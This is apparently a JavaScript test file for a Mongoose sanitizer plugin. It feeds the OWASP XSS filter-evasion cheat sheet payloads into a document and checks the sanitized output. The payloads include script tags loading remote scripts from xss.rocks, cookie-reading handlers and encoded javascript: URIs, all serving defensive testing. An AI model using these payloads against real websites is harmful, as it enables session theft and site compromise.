'use strict';

const should = require('chai').should();
const mongoose = require('mongoose');
const sanitizerPlugin = require('../src/');

const OWASP_FILTER_EVASION = {
  /* eslint-disable */
  locator: '\';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";\nalert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--\n></SCRIPT>">\'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>',
  locator_short: '\'\';!--"<XSS>=&{()}',
  no_filter_evasion: '<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>',
  filter_bypass_polyglot: '\'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)>\n<script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>\'-->"></script>\n<script>alert(document.cookie)</script>">\n<img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id)>\'">\n<img src="http://www.shellypalmer.com/wp-content/images/2015/07/hacked-compressor.jpg">',
  filter_bypass: '<a<a><<ab>script>alert(\'XSS\')<a<a><<ab>/script>',
  image: '<IMG SRC="javascript:alert(\'XSS\');">',
  image_no_quotes: '<IMG SRC=javascript:alert(\'XSS\')>',
  image_case_insensitive: '<IMG SRC=JaVaScRiPt:alert(\'XSS\')>',
  html_entities: '<IMG SRC=javascript:alert("XSS")>',
  grave_accent: '<IMG SRC=`javascript:alert("RSnake says, \'XSS\'")`>',
  malformed_anchor: '<a onmouseover="alert(document.cookie)">xxs link</a>',
  malformed_anchor_no_quotes: '<a onmouseover=alert(document.cookie)>xxs link</a>',
  malformed_img: '<IMG """><SCRIPT>alert("XSS")</SCRIPT>">',
  from_char_code: '<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>',
  image_default_src: '<IMG SRC=# onmouseover="alert(\'xxs\')">',
  image_blank_src: '<IMG SRC= onmouseover="alert(\'xxs\')">',
  image_no_src: '<IMG onmouseover="alert(\'xxs\')">',
  image_onerror: '<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>',
  image_onerror_encoded: '<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">',
  image_decimal_html_chars: '<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>',
  image_decimal_html_chars_no_semicolon: '<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>',
  image_hex_html_chars: '<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>',
  image_tab: '<IMG SRC="jav\tascript:alert(\'XSS\');">',
  image_tab_encoded: '<IMG SRC="jav&#x09;ascript:alert(\'XSS\');">',
  image_newline: '<IMG SRC="jav&#x0A;ascript:alert(\'XSS\');">',
  image_cr: '<IMG SRC="jav&#x0D;ascript:alert(\'XSS\');">',
  image_null: '<IMG SRC=java\0script:alert("XSS")>',
  image_space: '<IMG SRC=" &#14;  javascript:alert(\'XSS\');">',
  non_alphanumeric: '<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>',
  non_alphanumeric2: '<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>',
  non_alphanumeric3: '<SCRIPT/SRC="http://xss.rocks/xss.js"></SCRIPT>',
  extra_brackets: '<<SCRIPT>alert("XSS");//<</SCRIPT>',
  missing_closing_tag: '<SCRIPT SRC=http://xss.rocks/xss.js?< B >',
  protocol_resolution: '<SCRIPT SRC=//xss.rocks/.j>',
  open_ended: '<IMG SRC="javascript:alert(\'XSS\')"',
  double_brackets: '<iframe src=http://xss.rocks/scriptlet.html <',
  escaped_escape_chars: '\";alert(\'XSS\');//',
  close_script: '</script><script>alert(\'XSS\');</script>',
  close_title: '</TITLE><SCRIPT>alert("XSS");</SCRIPT>',
  image_input: '<INPUT TYPE="IMAGE" SRC="javascript:alert(\'XSS\');">',
  body_image: '<BODY BACKGROUND="javascript:alert(\'XSS\')">',
  image_dynsrc: '<IMG DYNSRC="javascript:alert(\'XSS\')">',
  image_lowsrc: '<IMG LOWSRC="javascript:alert(\'XSS\')">',
  list_style_image: '<STYLE>li {list-style-image: url("javascript:alert(\'XSS\')");}</STYLE><UL><LI>XSS</br>',
  image_vbscript: '<IMG SRC=\'vbscript:msgbox("XSS")\'>',
  image_livescript: '<IMG SRC="livescript:[code]">',
  svg: '<svg/onload=alert(\'XSS\')>',
  es6: 'Set.constructor`alert\x28document.domain\x29```',
  body_onload: '<BODY ONLOAD=alert(\'XSS\')>',
  bgsound: '<BGSOUND SRC="javascript:alert(\'XSS\');">',
  js_amp: '<BR SIZE="&{alert(\'XSS\')}">',
  stylesheet: '<LINK REL="stylesheet" HREF="javascript:alert(\'XSS\');">',
  stylesheet_remote: '<LINK REL="stylesheet" HREF="http://xss.rocks/xss.css">',
  stylesheet_remote_include: '<STYLE>@import\'http://xss.rocks/xss.css\';</STYLE>',
  stylesheet_remote_meta: '<META HTTP-EQUIV="Link" Content="<http://xss.rocks/xss.css>; REL=stylesheet">',
  stylesheet_mozilla: '<STYLE>BODY{-moz-binding:url("http://xss.rocks/xssmoz.xml#xss")}</STYLE>',
  style_ie_loop: '<STYLE>@im\port\'\ja\vasc\ript:alert("XSS")\';</STYLE>',
  image_style_comment: '<IMG STYLE="xss:expr/*XSS*/ession(alert(\'XSS\'))">',
  image_style_expression: 'exp/*<A STYLE=\'no\\xss:noxss("*//*");\nxss:ex/*XSS*//*/*/pression(alert("XSS"))\'>',
  style_netscape: '<STYLE TYPE="text/javascript">alert(\'XSS\');</STYLE>',
  style_background_image: '<STYLE>.XSS{background-image:url("javascript:alert(\'XSS\')");}</STYLE><A CLASS=XSS></A>',
  style_background: '<STYLE type="text/css">BODY{background:url("javascript:alert(\'XSS\')")}</STYLE>',
  style_anonymous_html: '<XSS STYLE="xss:expression(alert(\'XSS\'))">',
  local_htc: '<XSS STYLE="behavior: url(xss.htc);">',
  meta_refresh: '<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(\'XSS\');">',
  meta_refresh_data: '<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">',
  meta_extra_url: '<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert(\'XSS\');">',
  iframe: '<IFRAME SRC="javascript:alert(\'XSS\');"></IFRAME>',
  iframe_event: '<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>',
  frame: '<FRAMESET><FRAME SRC="javascript:alert(\'XSS\');"></FRAMESET>',
  table: '<TABLE BACKGROUND="javascript:alert(\'XSS\')">',
  td: '<TABLE><TD BACKGROUND="javascript:alert(\'XSS\')">',
  div: '<DIV STYLE="background-image: url(javascript:alert(\'XSS\'))">',
  div_unicode: '<DIV STYLE="background-image:\\0075\\0072\\006C\\0028\'\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028.1027\\0058.1053\\0053\\0027\\0029\'\\0029">',
  div_extra_chars: '<DIV STYLE="background-image: url(&#1;javascript:alert(\'XSS\'))">',
  div_expression: '<DIV STYLE="width: expression(alert(\'XSS\'));">',
  msie5_conditional: '<!--[if gte IE 4]>\n <SCRIPT>alert(\'XSS\');</SCRIPT>\n <![endif]-->',
  base: '<BASE HREF="javascript:alert(\'XSS\');//">',
  object: '<OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>',
  embed_flash: '<EMBED SRC="http://ha.ckers.Using an EMBED tag you can embed a Flash movie that contains XSS. Click here for a demo. If you add the attributes allowScriptAccess="never" and allownetworking="internal" it can mitigate this risk (thank you to Jonathan Vanasco for the info).:\norg/xss.swf" AllowScriptAccess="always"></EMBED>',
  embed_svg: '<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>',
  xml_cdata: '<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert(\'XSS\')"></B></I></XML>\n<SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>',
  xml_local: '<XML SRC="xsstest.xml" ID=I></XML>\n<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>',
  html_time: '<HTML><BODY>\n<?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time">\n<?import namespace="t" implementation="#default#time2">\n<t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>alert("XSS")</SCRIPT>">\n</BODY></HTML>',
  script_rename: '<SCRIPT SRC="http://xss.rocks/xss.jpg"></SCRIPT>',
  ssi: '<!--#exec cmd="/bin/echo \'<SCR\'"--><!--#exec cmd="/bin/echo \'IPT SRC=http://xss.rocks/xss.js></SCRIPT>\'"-->',
  php: '<? echo(\'<SCR)\';\necho(\'IPT>alert("XSS")</SCRIPT>\'); ?>',
  meta_cookie: '<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert(\'XSS\')</SCRIPT>">',
  quote_encapsulation: '<SCRIPT a=">" SRC="httx://xss.rocks/xss.js"></SCRIPT>',
  quote_encapsulation2: '<SCRIPT =">" SRC="httx://xss.rocks/xss.js"></SCRIPT>',
  quote_encapsulation3: '<SCRIPT a=">" \'\' SRC="httx://xss.rocks/xss.js"></SCRIPT>',
  quote_encapsulation4: '<SCRIPT "a=\'>\'" SRC="httx://xss.rocks/xss.js"></SCRIPT>',
  quote_encapsulation5: '<SCRIPT a=`>` SRC="httx://xss.rocks/xss.js"></SCRIPT>',
  quote_encapsulation6: '<SCRIPT a=">\'>" SRC="httx://xss.rocks/xss.js"></SCRIPT>',
  quote_encapsulation7: '<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="httx://xss.rocks/xss.js"></SCRIPT>',
  redirect: '<A HREF="javascript:document.location=\'http://www.google.com/\'">XSS</A>'
  /* eslint-enable */
};

const OWASP_FILTER_EVASION_SANITIZED = {
  /* eslint-disable */
  locator: '\';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//\";\nalert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--\n>\">\'>',
  locator_short: '\'\';!--"=&{()}',
  no_filter_evasion: '',
  filter_bypass_polyglot: "'\">><img>\">",
  filter_bypass: '',
  image: '<img>',
  image_no_quotes: '<img>',
  image_case_insensitive: '<img>',
  html_entities: '<img>',
  grave_accent: '<img>',
  malformed_anchor: '<a>xxs link</a>',
  malformed_anchor_no_quotes: '<a>xxs link</a>',
  malformed_img: '<img>">',
  from_char_code: '<img>',
  image_default_src: '<img>',
  image_blank_src: '<img>',
  image_no_src: '<img>',
  image_onerror: '<img>',
  image_onerror_encoded: '<img>',
  image_decimal_html_chars: '<img>',
  image_decimal_html_chars_no_semicolon: '<img>',
  image_hex_html_chars: '<img>',
  image_tab: '<img>',
  image_tab_encoded: '<img>',
  image_newline: '<img>',
  image_cr: '<img>',
  image_null: '<img>',
  image_space: '<img>',
  non_alphanumeric: '',
  non_alphanumeric2: '',
  non_alphanumeric3: '',
  extra_brackets: '<',
  missing_closing_tag: '',
  protocol_resolution: '',
  open_ended: '',
  double_brackets: '',
  escaped_escape_chars: '\";alert(\'XSS\');//',
  close_script: '',
  close_title: '',
  image_input: '<input type="IMAGE">',
  body_image: '',
  image_dynsrc: '<img>',
  image_lowsrc: '<img>',
  list_style_image: '<ul><li>XSS<br></li></ul>',
  image_vbscript: '<img>',
  image_livescript: '<img>',
  svg: '',
  es6: 'Set.constructor`alert\x28document.domain\x29```',
  body_onload: '',
  bgsound: '',
  js_amp: '<br>',
  stylesheet: '',
  stylesheet_remote: '',
  stylesheet_remote_include: '',
  stylesheet_remote_meta: '',
  stylesheet_mozilla: '',
  style_ie_loop: '',
  image_style_comment: '<img>',
  image_style_expression: 'exp/*<a></a>',
  style_netscape: '',
  style_background_image: '<a class="XSS"></a>',
  style_background: '',
  style_anonymous_html: '',
  local_htc: '',
  meta_refresh: '',
  meta_refresh_data: '',
  meta_extra_url: '',
  iframe: '<iframe></iframe>',
  iframe_event: '<iframe></iframe>',
  frame: '',
  table: '<table></table>',
  td: '<table><tbody><tr><td></td></tr></tbody></table>',
  div: '<div></div>',
  div_unicode: '<div></div>',
  div_extra_chars: '<div></div>',
  div_expression: '<div></div>',
  msie5_conditional: '',
  base: '',
  object: '',
  embed_flash: '',
  embed_svg: '',
  xml_cdata: '<i><b><img></b></i>\n<span></span>',
  xml_local: '\n<span></span>',
  html_time: '\n',
  script_rename: '',
  ssi: '',
  php: '',
  meta_cookie: '',
  quote_encapsulation: '',
  quote_encapsulation2: '',
  quote_encapsulation3: '',
  quote_encapsulation4: '',
  quote_encapsulation5: '',
  quote_encapsulation6: '',
  quote_encapsulation7: 'PT SRC="httx://xss.rocks/xss.js">',
  redirect: '<a>XSS</a>'
  /* eslint-enable */
};

const xss_string = 'Something & something else > XSS<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>';
const no_xss_string = 'Something & something else > XSS';
const legitimate_string = '<script>Preserve this</script>';

mongoose.plugin(sanitizerPlugin, {
  skip: ['non_sanitizable_field'],
  sanitizer: {
    ALLOWED_TAGS: ['img', 'meta', 'a', 'br', 'link', 'body', 'html', 'input', 'ul', 'li', 'style', 'div', 'iframe', 'table', 'td', 'tr', 'span', 'i', 'b']
  }
});

mongoose.Promise = global.Promise;

const TestSchema = new mongoose.Schema({
  sanitizable_field: String,
  non_sanitizable_field: String,
  object_field: {
    sub_sanitizable_field: {
      type: String
    },
    sub_non_sanitizable_field: {
      type: String
    }
  },
  raw_object_field: Object
});

mongoose.model('Test', TestSchema);

const Test = mongoose.model('Test');

const testDoc = new Test({
  sanitizable_field: xss_string,
  non_sanitizable_field: legitimate_string,
  object_field: {
    sub_sanitizable_field: xss_string
  },
  raw_object_field: {
    sanitizable_field: xss_string,
    object_field: {
      sanitizable_field: xss_string
    },
    owasp: OWASP_FILTER_EVASION
  }
});

describe('Mongoose Sanitizer Tests', () => {
  before(function(done) {
    mongoose.connect('mongodb://localhost/test', { useNewUrlParser: true, useUnifiedTopology: true }, (err) => {
      should.not.exist(err);
      done();
    });
  });

  after(() => {
    mongoose.connection.close();
  });

  it('should save a test document', () => testDoc.save((err) => {
    should.not.exist(err);
  }));

  it('should not sanitize skip fields', () => {
    testDoc.non_sanitizable_field.should.equal(legitimate_string);
  });

  it('should sanitize schema fields', () => {
    testDoc.sanitizable_field.should.equal(no_xss_string);
    testDoc.object_field.sub_sanitizable_field.should.equal(no_xss_string);
  });

  it('should sanitize non-schema sub-fields', () => {
    testDoc.raw_object_field.sanitizable_field.should.equal(no_xss_string);
    testDoc.raw_object_field.object_field.sanitizable_field.should.equal(no_xss_string);
  });

  it('should sanitize OWASP cheatsheet exploits', () => {
    testDoc.raw_object_field.owasp.should.deep.equal(OWASP_FILTER_EVASION_SANITIZED);
  });
});
